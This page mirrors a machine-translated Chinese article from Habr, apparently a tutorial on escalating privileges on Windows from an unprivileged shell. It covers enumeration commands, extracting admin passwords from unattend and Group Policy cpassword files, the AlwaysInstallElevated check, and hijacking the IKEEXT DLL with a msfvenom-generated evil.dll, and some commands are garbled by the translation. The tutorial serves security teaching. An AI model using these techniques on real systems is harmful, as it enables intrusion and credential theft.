<!doctype html>
<html class="no-js" lang="en">

<head>
  <!-- Global site tag (gtag.js) - Google Analytics -->
  <script async src="https://www.googletagmanager.com/gtag/js?id=UA-134228602-6"></script>
  <script>
    window.dataLayer = window.dataLayer || [];
    function gtag(){dataLayer.push(arguments);}
    gtag('js', new Date());

    gtag('config', 'UA-134228602-6');
  </script>

  <meta charset="utf-8">
  <meta http-equiv="x-ua-compatible" content="ie=edge">
  <title>👻 👉🏼 🌦️ Windows特权升级基础 🔛 🏯 🙆🏽</title>
  <link rel="icon" type="image/x-icon" href="/favicon.ico" />
  <meta name="description" content="我为自己和对发现有用的人做出了决定，收集了我所知道的一切，但在本文中我不记得这个话题了。 分享提示。 本文的主要来源是this 。 

 我自由翻译并从自己身上补充了一些东西，这些是我从其他来源收集和学习的。 

 通常，以下方法可以帮助我们实现特权升级目标。 

 这篇简短文章的起点是无特权的Sh...">
  <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">

  <link rel="stylesheet" href="../../css/main.css">

  <link href="https://fonts.googleapis.com/css?family=Quicksand&display=swap" rel="stylesheet">

  <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.3.1/jquery.min.js"></script>
  <script>window.jQuery || document.write('<script src="../../js/vendors/jquery-3.3.1.min.js"><\/script>')</script>

  <script>document.write('<script src="//pagea' + 'd2.googles' + 'yndication.com/pagea' + 'd/js/a' + 'dsby' + 'google.js"><\/script>')</script>
  <script>
        var superSpecialObject = {};
        superSpecialObject['google_a' + 'd_client'] = 'ca-p' + 'ub-6974184241884155';
        superSpecialObject['enable_page_level_a' + 'ds'] = true;
       (window['a' + 'dsbygoogle'] = window['a' + 'dsbygoogle'] || []).push(superSpecialObject);
  </script>
</head>

<body>
  <!--[if lte IE 9]>
    <p class="browserupgrade">You are using an <strong>outdated</strong> browser. Please <a href="https://browsehappy.com/">upgrade your browser</a> to improve your experience and security.</p>
  <![endif]-->
  <header class="page-header js-page-header">
    <a class="page-header-logo-container" href="https://weekly-geekly-es.github.io/index.html"></a>
    <div class="page-header-text">Geekly articles weekly</div>
  </header>
  <section class="page js-page"><h1>Windows特权升级基础</h1><div class="post__body post__body_full"><div class="post__text post__text-html post__text_v1" id="post-content-body" data-io-article-url="https://habr.com/ru/post/418441/">我为自己和对发现有用的人做出了决定，收集了我所知道的一切，但在本文中我不记得这个话题了。 分享提示。 本文的主要来源是<a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=zh-CN&amp;u=">this</a> 。 <br><br> 我自由翻译并从自己身上补充了一些东西，这些是我从其他来源收集和学习的。 <br><br> 通常，以下方法可以帮助我们实现特权升级目标。 <br><a name="habracut"></a><br> 这篇简短文章的起点是无特权的Shell（帐户）。 也许我们使用了漏洞利用程序或进行了攻击并获得了这个外壳。 <br><br> 基本上，一开始我们并不了解机器：它的功能，所连接的东西，所拥有的特权级别甚至是什么操作系统。 <br><br> 首先，我们需要获取所需的信息，以了解我们在哪里以及拥有什么： <br><br><pre><code class="hljs nginx"><span class="hljs-attribute"><span class="hljs-attribute">systeminfo</span></span> | findstr /B /C:<span class="hljs-string"><span class="hljs-string">" "</span></span> /C:<span class="hljs-string"><span class="hljs-string">" "</span></span></code> </pre> <br> 从中可以看到，该命令使您可以确定操作系统的名称和版本。 您可以在不带参数的情况下执行它，那么命令的输出将更加完整，但这对我们来说已经足够了。 <br><br> 接下来，重要的是找出机器的名称和我们用来连接的用户名。 <br><br><ul><li> 主机名是用户名。 </li><li>  echo％用户名％-用户名。 </li></ul><br> 接下来，让我们看看哪些用户仍在此主机上，并获得有关其用户的更多详细信息。 <br><br><ul><li> 净用户-其他用户 </li><li> 净用户user1-有关该用户的详细信息，其中user1是您的用户名。 </li></ul><br> 收到有关该帐户的信息后，我们将看到有关此主机的网络交互的信息。 <br><br> 首先，看一下可用的接口和路由表。 <br><br><ul><li>  ipconfig / all-有关可用接口的信息。 </li><li> 路线打印-路线表 </li><li>  arp -A-arp条目表 </li></ul><br> 接下来，我们将看到活动的网络连接和防火墙规则。 <br><br><ul><li>  netstat -ano-活动的网络连接。 </li></ul><br>  -a-使用此参数启动将显示所有活动的TCP连接以及系统侦听的TCP和UDP端口； <br>  -n-该参数允许您显示带有地址和端口号的活动TCP连接； <br>  -o-与上一个键相同，显示活动的TCP连接，但是将过程代码添加到统计信息中，已经可以确切确定哪个应用程序使用该连接。 <br><br><ul><li>  netsh防火墙显示状态-防火墙状态 </li><li>  netsh防火墙显示配置-防火墙配置 </li></ul><br> 最后，我们简要检查一下在受感染主机上起作用的内容：计划任务，运行进程，运行服务和已安装的驱动程序。 <br><br><pre> <code class="hljs nginx"><span class="hljs-attribute"><span class="hljs-attribute">schtasks</span></span> /query /fo LIST /v</code> </pre> <br> 在哪里 <br>  /查询-显示有关所有计划任务的数据， <br>  / FO LIST-列表输出。 <br>  / v-打印作业详细信息。 <br><br> 以下命令将正在运行的进程与正在运行的服务相关联。 <br><br><pre> <code class="hljs nginx"><span class="hljs-attribute"><span class="hljs-attribute">tasklist</span></span> /SVC</code> </pre> <br> 在哪里 <br>  / SVC-每个进程的映射服务。 <br><br> 另请参阅正在运行的Windows服务的列表。 <br><br><pre> <code class="hljs dos"><span class="hljs-built_in"><span class="hljs-built_in">net</span></span> <span class="hljs-built_in"><span class="hljs-built_in">start</span></span></code> </pre> <br> 查看有关受感染系统的驱动程序的信息也很有用。 <br><br><pre> <code class="hljs">DRIVERQUERY</code> </pre> <br> 接下来，我想谈一谈最有用的Windows命令-wmic。  WMIC（Windows管理规范命令）命令用于获取有关硬件和系统的信息，管理进程及其组件以及使用Windows Management Instrumentation（Windows Management Instrumentation或WMI）的功能更改设置。  <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=zh-CN&amp;u=">很好的描述</a> 。 <br><br> 不幸的是，如果用户不是Administrators组的成员，则默认情况下，某些Windows配置不允许访问WMIC（这是一个好主意）。 任何版本的XP都不允许从无特权的帐户访问WMIC。 <br><br> 相反，默认情况下，Windows 7 Professional和Windows 8 Enterprise使具有低特权的用户可以使用WMIC。 <br><br> 像往常一样-程序参数： <br><br><pre> <code class="hljs nginx"><span class="hljs-attribute"><span class="hljs-attribute">wmic</span></span> /?</code> </pre> <br>  <a href="">一个通过wmic收集信息的好脚本。</a> <br><br> 在继续之前，值得仔细阅读所收集的信息。 还需要注意系统中安装的补丁程序，因为有关系统漏洞的任何信息都将为我们增加特权提供额外的支持。  HotFix可以查找特权升级漏洞。 <br><br> 接下来，我们将考虑无人值守的安装。 如果需要安装和配置大量机器，通常，技术人员将不会为了配置每个人而在机器之间移动。 有几种无人值守安装解决方案。 对于我们来说，这些方法是什么以及它们如何工作并不重要，但重要的是，它们会留下用于安装过程的配置文件，其中包含许多机密信息，例如操作系统产品密钥和管理员密码。 我们最感兴趣的是管理员密码，我们可以使用它来增加特权。 <br><br> 通常，这些是以下目录： <br><br><ul><li>  c：\ sysprep.inf </li><li>  c：\ sysprep \ sysprep.xml </li><li>  ％WINDIR％\ Panther \ Unattend \ Unattended.xml </li><li>  ％WINDIR％\ Panther \ Unattended.xml </li></ul><br> 但是值得检查整个系统。 <br><br> 这些文件包含明文或BASE64编码的密码。 <br> 范例： <br><br>  Sysprep.inf-密码为明文形式。 <br><br><img src="https://habrastorage.org/webt/fq/1t/qm/fq1tqm53bjiwjlwsbrevzdcy6qw.png">  ” <br><br>  Sysprep.xml-base64编码的密码。 <br><br><img src="https://habrastorage.org/webt/rh/2r/gk/rh2rgkl3wtby-9lagcxmfrnrlgu.png">  ” <br><br>  Unattended.xml-base64编码的密码。 <br><br><img src="https://habrastorage.org/webt/5e/1p/gl/5e1pglvwtogk0kd0xn4cmey_hlo.png"><br><br> 另外，对于连接到域的主机，您可以搜索Group.xml文件，该文件包含AES256加密密码，但是可以解密，因为 密钥已发布在msdn（https://msdn.microsoft.com/zh-cn/library/cc422924.aspx）和其他来源上。 但是，如果使用在主机上创建本地用户或例如为本地管理员设置密码的策略，情况就是如此。 <br><br> 例如，我在这里： <br><br><img src="https://habrastorage.org/webt/jy/wu/4g/jywu4g6xzymrbkwwniw4m_3uckg.png"><br><br> 打开它后，我们正在寻找“ cpassword”参数。 <br><br><img src="https://habrastorage.org/webt/i9/ow/hk/i9owhkwprnwlpmltga00uj-awx4.png"><br><br> 接下来，您需要解密此序列。 我们使用例如<a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=zh-CN&amp;u=">CrypTool</a> 。 首先，解码Base64。 <br>  Base64的特征是其长度必须是4的倍数。因此，我们考虑4个块，如果最后一个块中没有足够的字符，则使用“ =”添加丢失的字符。 <br> 我得到2“ =”。 <br><br><img src="https://habrastorage.org/webt/bm/sc/73/bmsc73fsqblniktrnrsyugqowhi.png"><br><br> 接下来我们解密。 使用上面的键。 <br><br><img src="https://habrastorage.org/webt/-f/n0/nt/-fn0ntf9um-zfyfoqpn7uwafoay.png"><br><br> 我们删除了分隔字符的多余点，并获得了密码。 <br><br> 除了Group.xml，这里还有一些其他的策略首选项文件，它们可能具有一组额外的cPassword属性： <br><br><ul><li> 服务\ Services.xml </li><li>  ScheduledTasks \ ScheduledTasks.xml </li><li> 打印机\ Printers.xml </li><li> 驱动器\ Drives.xml </li><li>  DataSources \ DataSources.xml </li></ul><br> 但是，我们都喜欢自动化解决方案，因此我们可以尽快到达终点。 这里有两个主要选项，具体取决于我们拥有的shell /访问类型。 有一个metasploit模块可以通过已建立的会话执行（https://www.rapid7.com/db/modules/post/windows/gather/credentials/gpp），也可以使用PowerSploit的Get- <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=zh-CN&amp;u=">GPPPassword</a> 。 <br><br> 好吧接下来 我们将搜索奇怪的注册表参数“ AlwaysInstallElevated”。 此选项允许非特权用户从NT AUTHORITY \ SYSTEM安装.msi文件。 <br><br> 为了能够使用此功能，我们必须验证是否同时安装了两个注册表项，如果已安装，则可以获得SYSTEM外壳程序。 检查： <br><br><pre> <code class="hljs tex">reg query HKLM<span class="hljs-tag"><span class="hljs-tag">\</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">SOFTWARE</span></span></span></span><span class="hljs-tag"><span class="hljs-tag">\</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">Policies</span></span></span></span><span class="hljs-tag"><span class="hljs-tag">\</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">Microsoft</span></span></span></span><span class="hljs-tag"><span class="hljs-tag">\</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">Windows</span></span></span></span><span class="hljs-tag"><span class="hljs-tag">\</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">Installer</span></span></span></span><span class="hljs-tag"><span class="hljs-tag">\</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">AlwaysInstallElevated</span></span></span></span></code> </pre> <br><pre> <code class="hljs tex">reg query HKCU<span class="hljs-tag"><span class="hljs-tag">\</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">SOFTWARE</span></span></span></span><span class="hljs-tag"><span class="hljs-tag">\</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">Policies</span></span></span></span><span class="hljs-tag"><span class="hljs-tag">\</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">Microsoft</span></span></span></span><span class="hljs-tag"><span class="hljs-tag">\</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">Windows</span></span></span></span><span class="hljs-tag"><span class="hljs-tag">\</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">Installer</span></span></span></span><span class="hljs-tag"><span class="hljs-tag">\</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">AlwaysInstallElevated</span></span></span></span></code> </pre> <br>  Metasploit包含一个特殊的模块exploit / windows / local / always_install_elevated，该模块创建一个MSI文件，并内置一个特殊的可执行文件，安装程序将使用系统特权提取并执行该文件。 执行之后，msi文件停止安装，以防止在系统中注册操作。 此外，如果您使用/安静开关开始安装，那么您甚至都不会收到错误消息。 <br><br> 好了，系统上一些有用的搜索命令： <br><br> 下面的命令将在文件系统中搜索包含特定关键字的文件名。 您可以指定任意数量的关键字。 <br><br><pre> <code class="hljs markdown">dir /s <span class="hljs-emphasis"><span class="hljs-emphasis">*pass*</span></span> == <span class="hljs-emphasis"><span class="hljs-emphasis">*cred*</span></span> == <span class="hljs-emphasis"><span class="hljs-emphasis">*vnc*</span></span> == <span class="hljs-emphasis"><span class="hljs-emphasis">*.config*</span></span></code> </pre> <br> 通过关键字搜索特定的文件类型，此命令可以生成大量输出。 <br><br><pre> <code class="hljs nginx"><span class="hljs-attribute"><span class="hljs-attribute">findstr</span></span> /si password <span class="hljs-regexp"><span class="hljs-regexp">*.xml</span></span> <span class="hljs-regexp"><span class="hljs-regexp">*.ini</span></span> <span class="hljs-regexp"><span class="hljs-regexp">*.txt</span></span></code> </pre> <br> 类似地，下面的两个命令可用于grep注册表中的关键字，在本例中为“ password”。 <br><br><pre> <code class="hljs pgsql">reg query HKLM /f <span class="hljs-keyword"><span class="hljs-keyword">password</span></span> /t REG_SZ /s</code> </pre> <br><pre> <code class="hljs pgsql">reg query HKCU /f <span class="hljs-keyword"><span class="hljs-keyword">password</span></span> /t REG_SZ /s</code> </pre> <br> 目前，我们已经有足够的资源来使系统正常运行。 但是还有两种针对性更强的攻击才能获得理想的结果：我们将研究Windows服务以及文件和文件夹的权限。 我们的目标是使用弱权限来增强会话特权。 <br><br> 我们将检查很多访问权限，accesschk.exe是Microsoft Sysinternals Suite中的一个工具，它将帮助我们解决此问题。  Microsoft Sysinternals包含许多出色的工具。 可以从Microsoft Technet网站（https://docs.microsoft.com/ru-ru/sysinternals/downloads/sysinternals-suite）下载该程序包。 <br><br> 我们可以使用accesschk检查每个服务所需的特权级别。 <br><br> 我们可以看到每个用户级别拥有的权限。 <br><br><img src="https://habrastorage.org/webt/jo/pf/q2/jopfq2pwodrwtcexiainzaji4yk.png"><br><br>  Accesschk可以自动检查我们是否具有特定用户级别的Windows服务的写权限。 通常，作为低特权用户，我们要检查“用户”。 确保检查您属于哪些用户组。 <br><br>  -c名称是Windows服务，例如ssdpsrv（指定“ *”以显示所有服务） <br>  -d仅处理目录 <br>  -e仅显示明确指定的完整性级别（仅Windows Vista） <br>  -k名称是注册表项，例如hklm \ software <br>  -n仅显示没有访问规则的对象 <br>  -p名称或进程标识符（PID）被指定为名称，例如cmd.exe（指定“ *”作为显示所有进程的名称） <br>  -q省略标题 <br>  -r仅打印具有读取权限的对象 <br>  -s递归处理 <br>  -v打印详细信息 <br>  -w仅列出具有写访问权的对象 <br><br><img src="https://habrastorage.org/webt/4z/1r/u6/4z1ru6mikuprkxybtdzohmzgl5s.png"><br><br> 还有另一个有趣的命令： <br><br><pre> <code class="hljs dos">autorunsc.exe -a | <span class="hljs-built_in"><span class="hljs-built_in">findstr</span></span> /n /R "File\ <span class="hljs-keyword"><span class="hljs-keyword">not</span></span>\ found"</code> </pre> <br> 允许您找到有关自动启动但尚未从系统中丢失的文件的注册表项。 例如，如果服务被错误地删除，则该记录可以保留。 每次启动时，系统都尝试运行该文件失败。 您也可以利用这种情况来扩展权限。 只需将此文件替换为我们的文件即可。 <br><br> 接下来，我们考虑两个漏洞： <br><br> 首先：复制GreveHatHacker的Parvez发表的帖子的结果；  “通过利用弱文件夹权限来提升特权”（http://www.greyhathacker.net/?p=738）。 <br><br> 此示例是劫持dll的特例。 程序通常无法独立运行，它们具有许多需要连接的资源（主要是dll，但也包含自己的文件）。 如果程序或服务从我们具有写访问权的目录中下载文件，则我们可能会滥用该文件或服务来启动具有该程序运行权限的shell。 <br><br> 通常，Windows应用程序将使用预定义的搜索路径来查找dll，并且它将以特定顺序检查这些路径。  DLL劫持通常是通过沿这些路径之一放置恶意dll来发生的。 可以通过向应用程序指示所需dll的绝对路径来解决此问题。 <br><br>  dll搜索顺序： <br><br><ol><li> 运行应用程序的目录 </li><li>  32位系统目录（C：\ Windows \ System32） </li><li>  16位系统目录（C：\ Windows \ System） </li><li>  Windows目录（C：\ Windows） </li><li> 当前工作目录（CWD） </li><li>  PATH环境变量中的目录（系统然后是用户） </li></ol><br> 有时应用程序尝试下载计算机上缺少的dll文件。 发生这种情况的原因可能有多种，例如，如果某些未安装的某些插件或组件仅需要dll库，则可能会发生这种情况。 在这种情况下，Parvez发现某些Windows服务正在尝试加载默认设置中不存在的dll库。 <br><br> 由于dll不存在，因此我们最终要遍历所有搜索路径。 作为特权级别低的用户，我们几乎没有机会在项目1-4、5中放置恶意dll。但是，如果我们对任何目录具有写访问权限，那么获胜的机会就很大。 <br><br> 让我们看看它在实际中是如何工作的，对于我们的示例，我们将使用IKEEXT（IPSec IKE和AuthIP密钥模块）服务，该服务尝试下载wlbsctrl.dll。 <br><br>  “ C：\”中的任何目录都将为经过身份验证的用户提供写访问权限，这为我们提供了机会。 <br><br><pre> <code class="hljs tex">C:<span class="hljs-tag"><span class="hljs-tag">\</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">Users</span></span></span></span><span class="hljs-tag"><span class="hljs-tag">\</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">user</span></span></span></span>1<span class="hljs-tag"><span class="hljs-tag">\</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">Desktop</span></span></span></span>&gt; accesschk.exe -dqv "C:<span class="hljs-tag"><span class="hljs-tag">\</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">Python</span></span></span></span>27"</code> </pre> <br><pre> <code class="hljs pgsql">C:\Python27 Medium Mandatory <span class="hljs-keyword"><span class="hljs-keyword">Level</span></span> (<span class="hljs-keyword"><span class="hljs-keyword">Default</span></span>) [<span class="hljs-keyword"><span class="hljs-keyword">No</span></span>-<span class="hljs-keyword"><span class="hljs-keyword">Write</span></span>-Up] RW BUILTIN\Administrators FILE_ALL_ACCESS RW NT AUTHORITY\<span class="hljs-keyword"><span class="hljs-keyword">SYSTEM</span></span> FILE_ALL_ACCESS R BUILTIN\Users FILE_LIST_DIRECTORY FILE_READ_ATTRIBUTES FILE_READ_EA FILE_TRAVERSE SYNCHRONIZE READ_CONTROL RW NT AUTHORITY\Authenticated Users FILE_ADD_FILE FILE_ADD_SUBDIRECTORY FILE_LIST_DIRECTORY FILE_READ_ATTRIBUTES FILE_READ_EA FILE_TRAVERSE FILE_WRITE_ATTRIBUTES FILE_WRITE_EA <span class="hljs-keyword"><span class="hljs-keyword">DELETE</span></span> SYNCHRONIZE READ_CONTROL</code> </pre><br><pre> <code class="hljs tex">C:<span class="hljs-tag"><span class="hljs-tag">\</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">Users</span></span></span></span><span class="hljs-tag"><span class="hljs-tag">\</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">user</span></span></span></span>1<span class="hljs-tag"><span class="hljs-tag">\</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">Desktop</span></span></span></span>&gt; icacls "C:<span class="hljs-tag"><span class="hljs-tag">\</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">Python</span></span></span></span>27"</code> </pre> <br><pre> <code class="hljs tex">C:<span class="hljs-tag"><span class="hljs-tag">\</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">Python</span></span></span></span>27 BUILTIN<span class="hljs-tag"><span class="hljs-tag">\</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">Administrators</span></span></span></span>:(ID)F BUILTIN<span class="hljs-tag"><span class="hljs-tag">\</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">Administrators</span></span></span></span>:(OI)(CI)(IO)(ID)F NT AUTHORITY<span class="hljs-tag"><span class="hljs-tag">\</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">SYSTEM</span></span></span></span>:(ID)F NT AUTHORITY<span class="hljs-tag"><span class="hljs-tag">\</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">SYSTEM</span></span></span></span>:(OI)(CI)(IO)(ID)F BUILTIN<span class="hljs-tag"><span class="hljs-tag">\</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">Users</span></span></span></span>:(OI)(CI)(ID)R NT AUTHORITY<span class="hljs-tag"><span class="hljs-tag">\</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">Authenticated</span></span></span></span> Users:(ID)C NT AUTHORITY<span class="hljs-tag"><span class="hljs-tag">\</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">Authenticated</span></span></span></span> Users:(OI)(CI)(IO)(ID)C</code> </pre><br>  F-完全访问权限。 <br>  （OI）-对象继承。 <br>  （CI）-容器继承。 <br>  （IO）-仅继承。 <br>  （NP）-禁止继承分配。 <br>  （I）-从父容器继承权限。 <br><br> 在执行该操作之前，您必须检查IKEEXT服务的状态。 在这种情况下，我们可以看到它被设置为“ AUTO_START”！ <br><br><pre> <code class="hljs nginx"><span class="hljs-attribute"><span class="hljs-attribute">sc</span></span> qc IKEEXT</code> </pre> <br><pre> <code class="hljs tex">[SC] QueryServiceConfig SUCCESS SERVICE_NAME: IKEEXT TYPE : 20 WIN32_SHARE_PROCESS START_TYPE : 2 AUTO_START ERROR_CONTROL : 1 NORMAL BINARY_PATH_NAME : C:<span class="hljs-tag"><span class="hljs-tag">\</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">Windows</span></span></span></span><span class="hljs-tag"><span class="hljs-tag">\</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">system</span></span></span></span>32<span class="hljs-tag"><span class="hljs-tag">\</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">svchost</span></span></span></span>.exe -k netsvcs LOAD_ORDER_GROUP : TAG : 0 DISPLAY_NAME : IKE and AuthIP IPsec Keying Modules DEPENDENCIES : BFE SERVICE_START_NAME : LocalSystem</code> </pre> <br> 现在我们知道我们有必要的条件，并且我们可以创建一个恶意dll并拦截shell！ <br><br> 例如，我们使用Metasploit-&gt; msfvenom。 <br><br><img src="https://habrastorage.org/webt/ac/-m/_z/ac-m_z8lymihvi6r6g3dsxmebr8.png"><br><br> 将evil.dll传输到目标计算机后，我们要做的只是将其重命名为wlbsctrl.dll，然后将其移动到“ C：\ Python27”。 完成此操作后，我们需要耐心等待机器重新启动（或者我们可以尝试强制重新启动），我们将获得系统外壳。 <br><br><pre> <code class="hljs css"><span class="hljs-selector-tag"><span class="hljs-selector-tag">copy</span></span> <span class="hljs-selector-tag"><span class="hljs-selector-tag">evil</span></span><span class="hljs-selector-class"><span class="hljs-selector-class">.dll</span></span> <span class="hljs-selector-tag"><span class="hljs-selector-tag">C</span></span>:\<span class="hljs-selector-tag"><span class="hljs-selector-tag">Python27</span></span>\<span class="hljs-selector-tag"><span class="hljs-selector-tag">wlbsctrl</span></span><span class="hljs-selector-class"><span class="hljs-selector-class">.dll</span></span></code> </pre> <br> 之后，仅等待系统重启。 <br><br> 对于最后一个示例，我们将考虑计划的任务。 我将描述原理，因为 可能会有不同的情况。 <br><br> 我们发现任务计划程序从SYSTEM启动的过程，服务，应用程序。 <br> 我们检查对目标所在文件夹的访问权限。 <br><br><pre> <code class="hljs powershell">accesschk.exe <span class="hljs-literal"><span class="hljs-literal">-dqv</span></span> <span class="hljs-string"><span class="hljs-string">"__"</span></span></code> </pre> <br> 显然，这是一个严重的配置问题，但更糟糕的是，任何已认证用户（已认证用户）都对此文件夹具有写访问权。 在此示例中，我们可以简单地用metasploit生成的文件覆盖二进制可执行文件。 <br><br> 可以选择编码。 <br><br><img src="https://habrastorage.org/webt/7c/p6/qv/7cp6qviajkpgxvibpruzsgqhjv4.png"><br><br> 现在剩下的就是下载恶意可执行文件并将其覆盖在可执行文件文件夹中。 完成此操作后，我们可以安全地上床睡觉并在清晨进行全身步行。 <br><br> 这两个示例应该使我们了解在考虑文件和文件夹权限时必须寻找的漏洞。 学习Windows服务，计划任务和自动运行任务的所有binpath路径将花费一些时间。 <br><br> 最后，一些使用accesschk.exe的技巧。 <br><br> 查找磁盘上文件夹的所有弱权限。 <br><br><pre> <code class="hljs swift">accesschk.exe -uwdqs <span class="hljs-type"><span class="hljs-type">Users</span></span> <span class="hljs-built_in"><span class="hljs-built_in">c</span></span>:\ accesschk.exe -uwdqs <span class="hljs-string"><span class="hljs-string">"Authenticated Users"</span></span> <span class="hljs-built_in"><span class="hljs-built_in">c</span></span>:\</code> </pre><br> 查找磁盘上文件的所有弱权限。 <br><br><pre> <code class="hljs swift">accesschk.exe -uwqs <span class="hljs-type"><span class="hljs-type">Users</span></span> <span class="hljs-built_in"><span class="hljs-built_in">c</span></span>:\*.* accesschk.exe -uwqs <span class="hljs-string"><span class="hljs-string">"Authenticated Users"</span></span> <span class="hljs-built_in"><span class="hljs-built_in">c</span></span>:\*.*</code> </pre> <br> 像一切。 </div></div><p>Source: <a rel="nofollow" href="https://habr.com/ru/post/zh-CN418441/">https://habr.com/ru/post/zh-CN418441/</a></p>
<section class="more-articles-navigation-panel js-more-articles-navigation-panel">
<h4>More articles:</h4>
<nav class="list-of-articles-container js-list-of-articles-container"><ul class="list-of-pages js-list-of-pages">
<li><a href="../zh-CN418429/index.html">我在欧洲从事敏捷教练的工作经验，第二部分</a></li>
<li><a href="../zh-CN418431/index.html">想象中的问题-不良软件的根源</a></li>
<li><a href="../zh-CN418433/index.html">8月4日 彼得 程序员的第一个自行车追求</a></li>
<li><a href="../zh-CN418437/index.html">超速救援队</a></li>
<li><a href="../zh-CN418439/index.html">渐进式Web应用程序基础</a></li>
<li><a href="../zh-CN418443/index.html">GObject：封装，实例化，自省</a></li>
<li><a href="../zh-CN418445/index.html">Django Channels-现代网络的答案</a></li>
<li><a href="../zh-CN418447/index.html">为什么莫斯科Python Conf现在是++</a></li>
<li><a href="../zh-CN418449/index.html">适用于Python的二进制模块</a></li>
<li><a href="../zh-CN418451/index.html">3D打印课程。 在实践中通过3Dtool进行有效的支撑和层高更改</a></li>
</ul></nav>
</section><br />
<a href="../../allArticles.html"><strong>All Articles</strong></a>
<script src="../../js/main.js"></script>

<!-- Yandex.Metrika counter -->
<script type="text/javascript" >
  (function (d, w, c) {
      (w[c] = w[c] || []).push(function() {
          try {
              w.yaCounter57283870 = new Ya.Metrika({
                  id:57283870,
                  clickmap:true,
                  trackLinks:true,
                  accurateTrackBounce:true,
                  webvisor:true
              });
          } catch(e) { }
      });

      var n = d.getElementsByTagName("script")[0],
          s = d.createElement("script"),
          f = function () { n.parentNode.insertBefore(s, n); };
      s.type = "text/javascript";
      s.async = true;
      s.src = "https://mc.yandex.ru/metrika/watch.js";

      if (w.opera == "[object Opera]") {
          d.addEventListener("DOMContentLoaded", f, false);
      } else { f(); }
  })(document, window, "yandex_metrika_callbacks");
</script>
<noscript><div><img src="https://mc.yandex.ru/watch/57283870" style="position:absolute; left:-9999px;" alt="" /></div></noscript>

<!-- Google Analytics -->
  <script>
    window.ga = function () { ga.q.push(arguments) }; ga.q = []; ga.l = +new Date;
    ga('create', 'UA-134228602-6', 'auto'); ga('send', 'pageview')
  </script>
  <script src="https://www.google-analytics.com/analytics.js" async defer></script>

</section>

<footer class="page-footer">
  <div class="page-footer-legal-info-container page-footer-element">
    <p>
      Weekly-Geekly ES | <span class="page-footer-legal-info-year js-page-footer-legal-info-year">2019</span>
    </p>
  </div>
  <div class="page-footer-counters-container page-footer-element">
    <a class="page-footer-counter-clustrmap" href='#'  title='Visit tracker'><img src='https://clustrmaps.com/map_v2.png?cl=698e5a&w=271&t=t&d=9uU9J9pq8z7k8xEBHYSfs6DenIBAHs3vLIHcPIJW9d0&co=3a3a3a&ct=ffffff'/></a>
  </div>
</footer>
  
</body>

</html>